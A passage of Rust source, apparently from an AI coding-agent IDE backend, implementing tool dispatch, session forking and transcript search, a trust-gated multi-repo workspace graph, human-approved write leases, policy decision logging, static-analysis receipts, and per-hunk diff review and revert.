    /// by [`DispatchRecorder`] hanging off the dispatcher itself, so the kernel agent - which holds
    /// the dispatcher directly and never enters this function - records exactly the same things.
    /// All this adds is the attribution: without it a dispatch is recorded against the default
    /// session with no run, which is honest but ungrouped.
    pub async fn dispatch_tool(
        &self,
        session_id: SessionId,
        run_id: Option<RunId>,
        call: ToolCall,
    ) -> Result<ToolResult> {
        crate::tools::with_dispatch_context(session_id, run_id, self.dispatcher.dispatch(call))
            .await
    }

    /// Schedule a parallel kernel run via `hide_fleet::FleetManager` and drive it
    /// to completion (the now-real fleet path - the previously-dead `hide-fleet`
    /// dep is load-bearing here). The run is enqueued, admitted under the fleet
    /// Governor, isolated in a (fake-git, in this shell) worktree, and driven by a
    /// `KernelRunLauncher` over a launcher kernel. Returns the job's terminal
    /// status string.
    ///
    /// The launcher kernel is built on-demand here (fleet scheduling is
    /// model-free: it drives to a terminal phase without a serve). This replaces
    /// the retired dormant `self.kernel` StubPlanner the host used to hold as a
    /// field off the live turn (see consolidation 2.1); the live turn builds its
    /// own real kernel via [`build_turn_kernel`](Self::build_turn_kernel).
    pub async fn fleet_run(
        &self,
        session_id: SessionId,
        objective: impl Into<String>,
    ) -> Result<String> {
        // A deterministic fixed probe with ample headroom (no thermal/RAM
        // pressure) so the run admits in the test/headless path; production swaps
        // in `OsResourceProbe`.
        let probe = Arc::new(FixedResourceProbe {
            snapshot: ResourceSnapshot {
                free_memory_mb: 32_768,
                ..ResourceSnapshot::idle()
            },
        });
        let kernel = Arc::new(AgentKernel::new(self.services.event_log.clone()));
        let launcher = Arc::new(KernelRunLauncher::new(kernel).with_max_steps(64));
        let manager = FleetManager::new(
            self.services.event_log.clone(),
            FleetGovernor::default(),
            probe,
            launcher,
            FleetConfig::default(),
        )
        .with_fake_worktrees();

        let job = AgentJob::new(objective, PriorityClass::Normal)
            .with_session(session_id)
            .with_concurrency_class(ConcurrencyClass::Model);
        let job_id = job.id.clone();
        manager.enqueue(job).await?;
        manager.run_to_quiescence(2, 64).await?;

        let status = manager
            .queue()
            .get(&job_id)
            .map(|j| format!("{:?}", j.status))
            .unwrap_or_else(|| "Unknown".to_string());
        Ok(status)
    }

    /// Generate against a (supervised) runtime through the kernel's runtime-client
    /// seam and publish the completion onto the push Wire-B bus.
    ///
    /// This is the host's end-to-end generation path: a `KernelRuntimeClient`
    /// (router + the host's HTTP `ModelProvider`, adapted to the orch
    /// `InferenceClient` seam) produces tokens; each token batch is published - 
    /// with coalescing - onto the broadcast bus, then flushed at stream end. The
    /// returned string is the full completion (for callers that also want it
    /// inline). `base_url` is the supervised serve's base (from the
    /// `RuntimeSupervisor`).
    pub async fn generate_and_publish(
        &self,
        session_id: SessionId,
        base_url: impl Into<String>,
        prompt: impl Into<String>,
    ) -> Result<String> {
        use crate::model_provider::{HttpModelProvider, ModelProviderInferenceClient};

        let provider = HttpModelProvider::new(base_url);
        let inference: Arc<dyn hawking_orch::inference::InferenceClient> =
            Arc::new(ModelProviderInferenceClient::new(provider));
        // Both generation entry points funnel through `run_turn_core` so the live
        // path and this one build the SAME real request (compiled context + real
        // history + a derived budget) and can never drift. This twin skips the
        // per-step / post-turn live-manifest telemetry (no run/interrupt wiring).
        let outcome = run_turn_core(
            inference,
            self.services.event_log.clone(),
            self.services.role_registry.clone(),
            self.services.code_index.clone(),
            self.services.memory_store.clone(),
            self.ui_bus.clone(),
            session_id,
            prompt.into(),
            None,
            None,
            self.services.repo_instructions.clone(),
        )
        .await?;
        Ok(outcome.completion)
    }

    /// Time-travel: scrub a session's projection to (and including) `seq`. A
    /// read-only view into the past (does not clobber the live projection).
    pub async fn scrub_to_event(
        &self,
        session_id: SessionId,
        seq: u64,
    ) -> Result<SessionProjection> {
        self.replay.scrub_to_event(session_id, seq).await
    }

    /// Time-travel: fork a new session from `from`'s log prefix up to `at_seq`.
    pub async fn fork_session(
        &self,
        from: SessionId,
        at_seq: u64,
    ) -> Result<(SessionId, SessionProjection)> {
        self.replay.fork_session(from, at_seq).await
    }

    /// Time-travel FORK by EVENT boundary (bible sec 78.1 #7): create a NEW
    /// session whose durable history is `from` folded up to (and including)
    /// `at_event`, with ANCESTRY recorded (parent + boundary) and the new thread
    /// SURFACED to the client as a [`SessionRecord`] plus a UiEvent. `at_event =
    /// None` forks the WHOLE session (its current tail).
    ///
    /// Independence is structural: [`BackendReplayService::fork_session`]
    /// re-appends the source prefix under a fresh `SessionId` (a new event
    /// lineage), so the original is untouched and later appends to either side
    /// never cross over. Ancestry is stored OUT of the fork's own event log (in
    /// the KV `session_records` namespace) so it never pollutes the fork's
    /// transcript and survives a workspace reopen.
    pub async fn fork_session_from_event(
        &self,
        from: SessionId,
        at_event: Option<&hide_core::ids::EventId>,
    ) -> Result<(SessionId, crate::services::SessionRecord, SessionProjection)> {
        let (new_session, record, projection) = fork_and_record(
            &self.replay,
            &self.services.sessions,
            &self.services.key_value_store,
            from,
            at_event.cloned(),
        )
        .await?;
        // Surface the new thread to the client: a durable record + a live UiEvent,
        // published UNDER the new session id so the FE adopts the fork.
        self.publish_session_forked(&new_session, &record);
        Ok((new_session, record, projection))
    }

    /// Search the durable transcript (bible sec 32-33): a LITERAL substring plus
    /// STRUCTURED filters (kind / session / role / time range), ranked
    /// deterministically and bounded. No model, no embeddings (semantic search is
    /// `DEFERRED_MODEL_REQUIRED`).
    pub async fn search_transcript(
        &self,
        query: &crate::replay::TranscriptQuery,
    ) -> Result<Vec<crate::replay::TranscriptHit>> {
        self.replay.search_transcript(query).await
    }

    /// Dispatch a `search` / `search_transcript` custom intent (census sec 32-33):
    /// build a [`TranscriptQuery`](crate::replay::TranscriptQuery) from the FE
    /// payload and run the model-free literal + structured search. The command
    /// palette speaks `/intent`, so this is how it searches without a `/rpc` dial.
    ///
    /// Payload: `{ query | text, session_id?, kind?, role?, since_ts?, until_ts?,
    /// limit?, scopes? }`. The structured filters (`kind` / `role`) may sit at the
    /// top level or under a `scopes` object (top level wins). Semantic search is
    /// DEFERRED_MODEL_REQUIRED and never runs here.
    async fn handle_search_intent(
        &self,
        payload: &Value,
    ) -> Result<Vec<crate::replay::TranscriptHit>> {
        let scopes = payload.get("scopes");
        // A field is read from the top level, falling back to `scopes`.
        let field = |name: &str| {
            payload
                .get(name)
                .or_else(|| scopes.and_then(|s| s.get(name)))
        };
        let mut query = crate::replay::TranscriptQuery {
            text: payload
                .get("query")
                .or_else(|| payload.get("text"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            ..Default::default()
        };
        query.session_id = field("session_id")
            .and_then(|v| v.as_str())
            .map(SessionId::from);
        query.kind = field("kind").and_then(|v| v.as_str()).map(str::to_string);
        query.role = field("role").and_then(|v| v.as_str()).map(str::to_string);
        query.since_ts = field("since_ts").and_then(|v| v.as_u64());
        query.until_ts = field("until_ts").and_then(|v| v.as_u64());
        query.limit = payload
            .get("limit")
            .and_then(|v| v.as_u64())
            .map(|n| n as usize);
        self.search_transcript(&query).await
    }

    /// Surface transcript-search hits to the FE as a `search_results` UiEvent
    /// (echoing the query so the palette can correlate the response).
    fn publish_search_results(&self, payload: &Value, hits: &[crate::replay::TranscriptHit]) {
        let query = payload
            .get("query")
            .or_else(|| payload.get("text"))
            .and_then(|v| v.as_str())
            .unwrap_or("");
        self.ui_bus.publish(UiEvent {
            seq: 0,
            session_id: None,
            kind: UiEventKind::Custom(json!({
                "kind": "search_results",
                "query": query,
                "count": hits.len(),
                "hits": serde_json::to_value(hits).unwrap_or_else(|_| json!([])),
            })),
        });
    }

    /// The conversation graph (bible sec 32-33) rooted at `session_id`: the node,
    /// its ancestry chain (to a root), and its direct children (forks / side chats
    /// / ephemeral forks), with parent->child edges. A bounded, DETERMINISTIC
    /// projection over the durable `session_records` KV -- no model, safe headless.
    pub fn conversation_graph(&self, session_id: &SessionId) -> crate::services::ConversationGraph {
        self.services
            .sessions
            .conversation_graph(&self.services.key_value_store, session_id)
    }

    // --- Multi-repo workspace graph (bible sec 35, sec 78.1 #14) -------------

    /// Add (or replace) a REPOSITORY node in the workspace graph. Idempotent by
    /// `repo_id`. A repo enters UNTRUSTED unless the node already carries a trust
    /// decision (trust-before-config): while untrusted its instructions / policy
    /// refs are inert (see [`RepoNode::active_instructions_ref`]). Written to the
    /// durable KV `workspace_repos` namespace so the graph survives a reopen.
    pub fn workspace_add_repo(&self, repo: RepoNode) -> Result<RepoNode> {
        WorkspaceStore::put_repo(&self.services.key_value_store, &repo)?;
        Ok(repo)
    }

    /// Look up a repo node by id.
    pub fn workspace_repo(&self, repo_id: &str) -> Option<RepoNode> {
        WorkspaceStore::get_repo(&self.services.key_value_store, repo_id)
    }

    /// TRUST (or untrust) a repo already in the graph: the trust-before-config
    /// gate. Only after this flips to `Trusted` are the repo's instructions /
    /// policy refs treated active. Returns the updated node, or `None` when no
    /// such repo exists.
    pub fn workspace_set_repo_trust(
        &self,
        repo_id: &str,
        trust: TrustState,
    ) -> Result<Option<RepoNode>> {
        let kv = &self.services.key_value_store;
        match WorkspaceStore::get_repo(kv, repo_id) {
            Some(mut repo) => {
                repo.trust = trust;
                WorkspaceStore::put_repo(kv, &repo)?;
                Ok(Some(repo))
            }
            None => Ok(None),
        }
    }

    // --- The task-scoped transactional write lease --------------------------
    //
    // Data shape, enforcement point, restart policy: crates/hide-backend/src/tools.rs.
    // The host owns only the GRANT conditions, the REVOCATION triggers, and the read the
    // status bar renders.

    /// Install the write lease for an approved task.
    ///
    /// Reached ONLY from [`Self::released_effect`], i.e. only after a human approved the
    /// `grant_write_lease` gate. That approval is the "user explicitly started or approved an
    /// implementation task" condition, and it is not forgeable from here: the effect is
    /// `ApprovalPolicy::Ask` in the ONE catalog, so [`Self::gated_effect`]'s sibling machinery
    /// parks it whatever channel it arrived on.
    ///
    /// The remaining grant conditions are read, not assumed:
    /// * `repo_id` must name a repo in the workspace graph and that repo must be TRUSTED. An
    ///   untrusted repo is inert by trust-before-config, so it can never be leased.
    /// * the scope is the trusted repo's OWN root, optionally narrowed by declared relative
    ///   sub-paths. `workspace_resolve` is the same confinement helper the fs connector uses, so a
    ///   declared scope cannot name a path outside the repo it claims to be inside.
    ///
    /// `{ repo_id, scopes?: [rel], session_id?, run_id? }`.
    async fn handle_grant_write_lease(&self, payload: &Value) -> Result<()> {
        let repo_id = payload
            .get("repo_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| {
                hide_core::error::HideError::Message(
                    "grant_write_lease: missing 'repo_id'".to_string(),
                )
            })?;
        let repo = self.workspace_repo(repo_id).ok_or_else(|| unknown_repo(repo_id))?;
        if repo.trust != TrustState::Trusted {
            return Err(hide_core::error::HideError::PolicyDenied(format!(
                "{repo_id} is not trusted; trust the repository before granting it a write lease"
            )));
        }
        let scopes = match payload.get("scopes").and_then(|v| v.as_array()) {
            Some(rels) if !rels.is_empty() => rels
                .iter()
                .filter_map(|v| v.as_str())
                .map(|rel| crate::connectors::workspace_resolve(&repo.root_path, rel))
                .collect::<Result<Vec<_>>>()?,
            _ => vec![repo.root_path.clone()],
        };
        let lease = crate::tools::install_write_lease(crate::tools::WriteLease {
            lease_id: hide_core::ids::GrantId::new().as_str().to_string(),
            repo_id: repo_id.to_string(),
            session_id: payload
                .get("session_id")
                .and_then(|v| v.as_str())
                .map(str::to_string),
            run_id: payload
                .get("run_id")
                .and_then(|v| v.as_str())
                .map(str::to_string),
            scopes,
            granted_ms: hide_core::ids::now_ms(),
        });
        publish_write_lease(&self.ui_bus, Some(&lease), "granted");
        Ok(())
    }

    /// The lease in force, if any (test / inspection / the status read).
    pub fn write_lease(&self) -> Option<crate::tools::WriteLease> {
        crate::tools::active_write_lease()
    }

    /// Add (or replace) an ENVIRONMENT node in the workspace graph. Idempotent by
    /// `env_id`. Written to the durable KV `workspace_environments` namespace.
    pub fn workspace_add_environment(&self, env: EnvironmentNode) -> Result<EnvironmentNode> {
        WorkspaceStore::put_environment(&self.services.key_value_store, &env)?;
        Ok(env)
    }

    /// Look up an environment node by id.
    pub fn workspace_environment(&self, env_id: &str) -> Option<EnvironmentNode> {
        WorkspaceStore::get_environment(&self.services.key_value_store, env_id)
    }

    /// Add (or replace) a typed EDGE between two repos. Idempotent by the
    /// `from|kind|to` triple. Written to the durable KV `workspace_edges`
    /// namespace.
    pub fn workspace_add_edge(
        &self,
        from: impl Into<String>,
        to: impl Into<String>,
        kind: WorkspaceEdgeKind,
    ) -> Result<WorkspaceEdge> {
        let edge = WorkspaceEdge::new(from, to, kind);
        WorkspaceStore::put_edge(&self.services.key_value_store, &edge)?;
        Ok(edge)
    }

    /// The deterministic multi-repo workspace-graph projection (bible sec 35):
    /// every repo node, every environment node, and every typed edge, each in a
    /// stable order (repos by id, environments by id, edges by from/kind/to). A
    /// flat, model-free read of the durable `workspace_*` KV namespaces.
    pub fn workspace_graph(&self) -> WorkspaceGraph {
        WorkspaceStore::graph(&self.services.key_value_store)
    }

    /// Switch a session's active ENVIRONMENT (bible sec 35.3) WITHOUT losing the
    /// session/thread: the switch is recorded as a durable `environment.switch`
    /// event on the SAME session log, carrying `{ previous_env, new_env, reason,
    /// fs_roots, tool_scopes }`, and the session's current-environment pointer is
    /// advanced. The target environment must already be in the graph (`NotFound`
    /// otherwise). The session id is unchanged and the log keeps growing, so the
    /// caller continues in the same thread under the new context.
    pub async fn environment_switch(
        &self,
        session: SessionId,
        env_id: &str,
        reason: impl Into<String>,
    ) -> Result<EnvironmentSwitch> {
        let kv = &self.services.key_value_store;
        let env = WorkspaceStore::get_environment(kv, env_id).ok_or_else(|| {
            hide_core::error::HideError::NotFound(format!(
                "unknown environment {env_id} (add it to the workspace graph first)"
            ))
        })?;
        let previous_env = WorkspaceStore::current_env(kv, &session);
        let switch = EnvironmentSwitch {
            session_id: session.clone(),
            previous_env,
            new_env: env.env_id.clone(),
            reason: reason.into(),
            fs_roots: env.fs_roots.clone(),
            tool_scopes: env.tool_scopes.clone(),
            switched_ms: hide_core::ids::now_ms(),
        };
        // Durable: append the switch to the SAME session log (the thread is not
        // lost, it is the same lineage one event longer), then advance the
        // session's current-environment pointer.
        self.services
            .event_log
            .append(NewEvent::system(
                session.clone(),
                "environment.switch",
                serde_json::to_value(&switch).unwrap_or(Value::Null),
            ))
            .await?;
        WorkspaceStore::set_current_env(kv, &session, &env.env_id)?;
        self.publish_environment_switch(&switch);
        Ok(switch)
    }

    /// All durable environment switches recorded for a session, in log order
    /// (bible sec 35.3 reader).
    pub async fn environment_switches(
        &self,
        session: &SessionId,
    ) -> Result<Vec<EnvironmentSwitch>> {
        let events = self
            .services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await?;
        Ok(events
            .into_iter()
            .filter(|event| event.kind == "environment.switch")
            .filter_map(|event| event.payload_as::<EnvironmentSwitch>())
            .collect())
    }

    /// Publish an `environment_switch` UiEvent carrying the switch record, under
    /// the switched session (so the FE re-scopes fs roots / tool scopes).
    fn publish_environment_switch(&self, switch: &EnvironmentSwitch) {
        self.ui_bus.publish(UiEvent {
            seq: 0,
            session_id: Some(switch.session_id.clone()),
            kind: UiEventKind::Custom(json!({
                "kind": "environment_switch",
                "record": serde_json::to_value(switch).unwrap_or_else(|_| json!({})),
            })),
        });
    }

    // --- Typed effect ledger + policy decisions (bible sec 40, sec 78.1 #7) ---

    /// Evaluate the durable POLICY for a tool call and record it.
    ///
    /// Looks the tool's DECLARED effects up in the builtin capability registry
    /// (`hide_extension_registry::build_builtin_tool_registry`, never a hardcoded
    /// table), consults the existing `hide-security` permission engine, derives a
    /// typed [`PolicyDecision`], and RECORDS it as a durable `policy.decision`
    /// event carrying `{ tool, effects, decision, reason }` (sec 40.1). The
    /// derived decision is returned and is readable afterwards via
    /// [`Self::policy_decisions`].
    ///
    /// This is ADDITIVE and MODEL-FREE. The [`ToolDispatcher`] still gates every
    /// call against the permission engine independently; nothing here weakens
    /// that path. A model-assisted policy refinement is `DEFERRED_MODEL_REQUIRED`
    /// (see `crate::policy`).
    pub async fn evaluate_tool_policy(
        &self,
        session: &SessionId,
        tool_id: &str,
        args: &Value,
    ) -> Result<PolicyDecision> {
        let effects = tool_declared_effects(tool_id);
        let verdict = self.permission_verdict_for(tool_id, args);
        let (decision, reason) = derive_policy_decision(&effects, &verdict);
        let record = PolicyDecisionRecord {
            tool: tool_id.to_string(),
            effects: effects.iter().map(|effect| effect.as_str().to_string()).collect(),
            decision,
            reason,
        };
        self.services
            .event_log
            .append(NewEvent::system(
                session.clone(),
                "policy.decision",
                serde_json::to_value(&record).unwrap_or(Value::Null),
            ))
            .await?;
        Ok(decision)
    }

    /// Build a permission-engine verdict for a tool call, mirroring the
    /// [`ToolDispatcher`] request shape: the tool's advertised capability kind, a
    /// target extracted from the call args, and a risk keyed on the spec's
    /// `destructive` annotation. Consulted by [`Self::evaluate_tool_policy`] for
    /// the write path. Model-free.
    fn permission_verdict_for(
        &self,
        tool_id: &str,
        args: &Value,
    ) -> hide_core::permission::PermissionVerdict {
        use hide_core::permission::{PermissionEngine, PermissionRequest};
        use hide_core::types::RiskLevel;
        let engine = SecurityServices::permission_engine(&self.services.config);
        let spec = self.tools.get(tool_id).map(|tool| tool.spec().clone());
        let capability_kind = spec
            .as_ref()
            .and_then(|s| s.capabilities_required.first().cloned())
            .unwrap_or_else(|| "tool.call".to_string());
        let risk = match spec.as_ref() {
            Some(s) if s.annotations.destructive => RiskLevel::High,
            Some(_) => RiskLevel::Low,
            None => RiskLevel::High,
        };
        let target = policy_target_from_args(tool_id, args);
        engine.evaluate(&PermissionRequest {
            capability_kind,
            target,
            risk,
            effects: Vec::new(),
            grant: None,
        })
    }

    /// All durable policy decisions recorded for a session, in log order (bible
    /// sec 40.1 reader).
    pub async fn policy_decisions(
        &self,
        session: &SessionId,
    ) -> Result<Vec<PolicyDecisionRecord>> {
        let events = self
            .services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await?;
        Ok(events
            .into_iter()
            .filter(|event| event.kind == "policy.decision")
            .filter_map(|event| event.payload_as::<PolicyDecisionRecord>())
            .collect())
    }

    // --- Deterministic verification plane (bible Book IX sec 28-29, sec 78.1 #6) ---

    /// Run the model-free hide-verify [`StaticAnalysisOracle`] over `sources` and
    /// RECORD a durable verification receipt.
    ///
    /// The oracle is a genuine Tier1 DETERMINISTIC check (unwrap/expect outside
    /// test code, marker macros, the house-rule dash lint, long functions,
    /// TODO/FIXME) that runs entirely in-process: NO model, NO subprocess, same
    /// input -> same findings. It produces typed [`Finding`]s and a
    /// [`Verdict`](hide_verify::Verdict) (`Pass` when nothing at or above Warning
    /// fired, else `Fail` carrying the blocking reasons).
    ///
    /// The result is sealed into a [`StaticAnalysisReceipt`] (the
    /// [`VerificationReceipt`] + findings) with `tier = Tier1Deterministic`,
    /// `oracle = "static_analysis"`, the analyzed file paths as `scope`, and a
    /// content hash of the sources; it is appended as a `verify.result`-shaped
    /// event to the session's durable log and surfaced as a UiEvent. Read the
    /// recorded receipts back with [`Self::verification_receipts`].
    pub async fn run_static_analysis(
        &self,
        session: SessionId,
        sources: Vec<SourceFile>,
    ) -> Result<StaticAnalysisReceipt> {
        use hide_verify::Oracle;

        let oracle = StaticAnalysisOracle::new();
        let started_ms = hide_core::ids::now_ms();
        let input = hide_verify::VerificationInput::from_sources(sources.clone());
        let outcome = oracle.evaluate(&input);
        let duration_ms = hide_core::ids::now_ms().saturating_sub(started_ms);

        // Scope = the analyzed file paths (sorted + deduped): drives the
        // re-review dependency model and the authority reconciliation below.
        let mut scope: Vec<String> = sources.iter().map(|s| s.path.clone()).collect();
        scope.sort();
        scope.dedup();

        // Tie the verdict to an exact snapshot of the sources.
        let source_hash =
            hide_verify::source_hash_of(sources.iter().map(|s| (s.path.as_str(), s.text.as_str())));
        let verification_id = format!(
            "va-{}-{started_ms}",
            &source_hash[..source_hash.len().min(16)]
        );

        let receipt = VerificationReceipt::new(
            verification_id,
            VerificationTier::Tier1Deterministic,
            oracle.name(),
            None, // in-process oracle: no command was run
            scope,
            source_hash,
            outcome.verdict.clone(),
            started_ms,
            duration_ms,
        );
        let record = StaticAnalysisReceipt {
            receipt,
            findings: outcome.evidence.findings.clone(),
        };

        // Durable: append a `verify.result`-shaped event carrying the receipt +
        // findings-summary to the SAME session log (auditable + recoverable).
        self.services
            .event_log
            .append(NewEvent::system(
                session.clone(),
                "verify.result",
                serde_json::to_value(&record).unwrap_or(Value::Null),
            ))
            .await?;
        self.publish_verification(&record, &session);
        self.publish_diagnostics(&record, &session);
        Ok(record)
    }

    /// Every durable static-analysis receipt recorded for a session, in log order
    /// (bible sec 29 reader). Filters the session's `verify.result` events to the
    /// hide-verify receipts (a `hide_kernel` `Verdict` payload, which shares the
    /// event kind, is a disjoint shape and is skipped).
    pub async fn verification_receipts(
        &self,
        session: &SessionId,
    ) -> Result<Vec<StaticAnalysisReceipt>> {
        let events = self
            .services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await?;
        Ok(events
            .into_iter()
            .filter(|event| event.kind == "verify.result")
            .filter_map(|event| event.payload_as::<StaticAnalysisReceipt>())
            .collect())
    }

    /// The Tier4 review-role profiles as DATA (bible Book IX sec 28): correctness,
    /// security, performance, api-compatibility, tests, documentation, simplicity,
    /// scope. Each profile describes what a reviewer of that role focuses on, the
    /// context it needs, its output schema, and its acceptance condition.
    ///
    /// DEFERRED_MODEL_REQUIRED: EXECUTING a review role needs a model and is out
    /// of scope here. This returns profiles (data), NEVER a
    /// [`Verdict`](hide_verify::Verdict), and performs NO model call.
    pub fn review_role_profiles(&self) -> Vec<ReviewRoleProfile> {
        hide_verify::all_profiles()
    }

    /// The DATA profile for a single review role (bible Book IX sec 28). Like
    /// [`Self::review_role_profiles`], this is DEFERRED_MODEL_REQUIRED: it returns
    /// the profile, never a verdict, and calls no model.
    pub fn review_role_profile(&self, role: ReviewRole) -> ReviewRoleProfile {
        hide_verify::profile_for(role)
    }

    /// Reconcile a set of probabilistic review verdicts against the deterministic
    /// static-analysis receipts covering `scope`, honoring THE AUTHORITY RULE
    /// (bible Book IX sec 28-29): a probabilistic review may NEVER override a
    /// failing deterministic (Tier0/Tier1) receipt for the same scope.
    ///
    /// The deterministic receipts whose scope intersects `scope` are folded into
    /// [`TieredVerdict`]s and reconciled with the `reviews` through
    /// [`hide_verify::apply_gate`], which returns [`GateDecision::Reject`] on ANY
    /// deterministic failure regardless of what the review says. A review Pass can
    /// therefore never flip a Tier1 Fail. Model-free.
    pub fn reconcile_review_for_scope(
        &self,
        scope: &[String],
        deterministic: &[StaticAnalysisReceipt],
        reviews: &[TieredVerdict],
    ) -> GateDecision {
        let mut verdicts: Vec<TieredVerdict> = deterministic
            .iter()
            .filter(|r| scopes_intersect(&r.receipt.scope, scope))
            .map(|r| {
                TieredVerdict::new(
                    r.receipt.tier,
                    r.receipt.oracle.clone(),
                    r.receipt.verdict.clone(),
                )
            })
            .collect();
        verdicts.extend(reviews.iter().cloned());
        hide_verify::apply_gate(&verdicts)
    }

    /// Publish the `diagnostics` PROJECTION patch on Wire-B (the surface the FE
    /// actually consumes, alongside `turn` / `context_manifest`) so the StatusBar
    /// Problems counter binds to the real error/warning counts from the sealed
    /// receipt instead of a hardcoded 0/0. Additive: a new projection NAME only,
    /// no new UiEventKind. The durable `verify.result` receipt stays untouched and
    /// readable via [`Self::verification_receipts`].
    fn publish_diagnostics(&self, record: &StaticAnalysisReceipt, session: &SessionId) {
        self.ui_bus.publish(UiEvent {
            seq: 0,
            session_id: Some(session.clone()),
            kind: UiEventKind::ProjectionPatch {
                projection: "diagnostics".to_string(),
                patch: record.diagnostics_projection(),
            },
        });
    }

    /// Publish a `verification_receipt` UiEvent carrying the receipt + a
    /// findings-summary, under the analyzed session.
    fn publish_verification(&self, record: &StaticAnalysisReceipt, session: &SessionId) {
        self.ui_bus.publish(UiEvent {
            seq: 0,
            session_id: Some(session.clone()),
            kind: UiEventKind::Custom(json!({
                "kind": "verification_receipt",
                "summary": record.findings_summary(),
                "record": serde_json::to_value(record).unwrap_or_else(|_| json!({})),
            })),
        });
    }

    // --- Hunk-addressable diff review (census sec 23) ---

    /// Capture one applied `edit.*` call as an addressable hunk on the run's
    /// [`DiffProposal`] (creating it on the first edit of the run). The edit has
    /// ALREADY been written to disk by the verifying applier; this records the
    /// whole-file pre-image/post-image so the change can later be kept or reverted
    /// per hunk. Appends a durable `diff.proposed` event and republishes the diff
    /// projection. Called from [`Self::dispatch_tool`] for every successful edit
    /// under a run.
    /// Read a diff's hunks WITH provenance + base hash (census sec 23 reader).
    pub fn diff_get(&self, diff_id: &str) -> Option<DiffProposal> {
        DiffStore::get(&self.services.key_value_store, diff_id)
    }

    /// Keep the whole diff: mark every still-pending hunk Accepted and record a
    /// `diff.hunk.accepted` event per hunk. Nothing is written (already on disk).
    pub async fn apply_diff(&self, diff_id: &str) -> Result<DiffProposal> {
        let kv = &self.services.key_value_store;
        let mut proposal = DiffStore::get(kv, diff_id).ok_or_else(|| unknown_diff(diff_id))?;
        let ids: Vec<String> = proposal
            .hunks
            .iter()
            .filter(|h| h.status == HunkStatus::Pending)
            .map(|h| h.hunk_id.clone())
            .collect();
        for h in proposal.hunks.iter_mut() {
            if h.status == HunkStatus::Pending {
                h.status = HunkStatus::Accepted;
            }
        }
        DiffStore::put(kv, &proposal)?;
        for id in &ids {
            self.record_diff_event(&proposal, "diff.hunk.accepted", Some(id))
                .await?;
        }
        self.publish_diff(&proposal);
        Ok(proposal)
    }

    /// Keep exactly one hunk (mark Accepted). The change is already on disk from
    /// the immediate-apply flow, so this records the decision + a durable
    /// `diff.hunk.accepted` event carrying provenance; nothing is written.
    pub async fn apply_hunk(&self, diff_id: &str, hunk_id: &str) -> Result<DiffProposal> {
        let kv = &self.services.key_value_store;
        let mut proposal = DiffStore::get(kv, diff_id).ok_or_else(|| unknown_diff(diff_id))?;
        {
            let h = proposal
                .hunk_mut(hunk_id)
                .ok_or_else(|| unknown_hunk(hunk_id))?;
            h.status = HunkStatus::Accepted;
        }
        DiffStore::put(kv, &proposal)?;
        self.record_diff_event(&proposal, "diff.hunk.accepted", Some(hunk_id))
            .await?;
        self.publish_diff(&proposal);
        Ok(proposal)
    }

    /// Revert exactly one hunk on disk via an inverse write through the SAME
    /// verifying applier the agent uses (`edit.write_file` guarded by the
    /// post-image hash as `base_hash`: a hunk superseded by a later edit conflicts
    /// instead of clobbering). Marks the hunk Rejected, invalidates the
    /// verification receipts whose scope intersects the file, and records a durable
    /// `diff.hunk.rejected` event carrying provenance.
    pub async fn reject_hunk(&self, diff_id: &str, hunk_id: &str) -> Result<DiffProposal> {
        let kv = &self.services.key_value_store;
        let mut proposal = DiffStore::get(kv, diff_id).ok_or_else(|| unknown_diff(diff_id))?;
        let (file, before, after) = {
            let h = proposal.hunk(hunk_id).ok_or_else(|| unknown_hunk(hunk_id))?;
            (h.file.clone(), h.before.clone(), h.after.clone())
        };
        self.inverse_write(&proposal.session_id, &file, &before, &after)
            .await?;
        if let Some(h) = proposal.hunk_mut(hunk_id) {
            h.status = HunkStatus::Rejected;
        }
        DiffStore::put(kv, &proposal)?;
        self.record_diff_event(&proposal, "diff.hunk.rejected", Some(hunk_id))
            .await?;
        self.invalidate_verifications_for_files(&proposal.session_id, &[file])
            .await?;
        self.publish_diff(&proposal);
        Ok(proposal)
    }

    /// Undo the whole diff: revert every still-applied (Pending or Accepted) hunk
    /// on disk in reverse capture order (so later edits to the same file peel off
    /// first), invalidate the intersecting verification receipts, and record a
    /// durable `diff.reverted` event.
    pub async fn revert_diff(&self, diff_id: &str) -> Result<DiffProposal> {
        Self::gated_effect("revert_diff")?;
        let kv = &self.services.key_value_store;
        let mut proposal = DiffStore::get(kv, diff_id).ok_or_else(|| unknown_diff(diff_id))?;
        let mut reverted_files: Vec<String> = Vec::new();
        for i in (0..proposal.hunks.len()).rev() {
            if proposal.hunks[i].status == HunkStatus::Rejected {
                continue;
            }
            let (file, before, after) = {
                let h = &proposal.hunks[i];
                (h.file.clone(), h.before.clone(), h.after.clone())
            };
            self.inverse_write(&proposal.session_id, &file, &before, &after)
            .await?;
            proposal.hunks[i].status = HunkStatus::Rejected;
            reverted_files.push(file);
        }
        DiffStore::put(kv, &proposal)?;
        self.record_diff_event(&proposal, "diff.reverted", None).await?;
        self.invalidate_verifications_for_files(&proposal.session_id, &reverted_files)
            .await?;
        self.publish_diff(&proposal);
        Ok(proposal)
    }

    /// Write `before` back to `file` through the registered `edit.write_file` tool
    /// (the same verifying applier the agent uses), guarded by
    /// `base_hash == blake3(after)` so a file changed since the edit conflicts
    /// instead of being clobbered.
    ///
    /// ponytail: reverting a newly created file writes an empty file rather than
    /// deleting it. Delete-on-revert when a created-file hunk needs true undo.
    async fn inverse_write(
        &self,
        session: &SessionId,
        file: &str,
        before: &str,
        after: &str,
    ) -> Result<()> {
        let after_hash = blake3::hash(after.as_bytes()).to_hex().to_string();
        // Through the same recorded path as every other write (attributed, with no run: an undo is
        // a tool step in the timeline, not a new reviewable hunk of its own). Recorded hunk paths
        // are workspace-relative, so the applier is handed the absolute spelling.
        let path = if Path::new(file).is_absolute() {
            file.to_string()
        } else {
            self.services
                .config
                .workspace_root
                .join(file)
                .to_string_lossy()
                .into_owned()
        };
        let result = self
            .dispatch_tool(
                session.clone(),
                None,
                ToolCall::new(
                    "edit.write_file",
                    json!({ "path": path, "content": before, "base_hash": after_hash }),
                ),
            )
            .await?;
        if result.status != ToolStatus::Ok {
            return Err(hide_core::error::HideError::Message(format!(
                "revert of {file} failed: {}",
                tool_result_summary(&result)
            )));
        }
        Ok(())
    }

    /// Append a durable `diff.*` event carrying the diff projection + the target
    /// hunk's provenance (when a single hunk is addressed).
    async fn record_diff_event(
        &self,
        proposal: &DiffProposal,
        kind: &str,
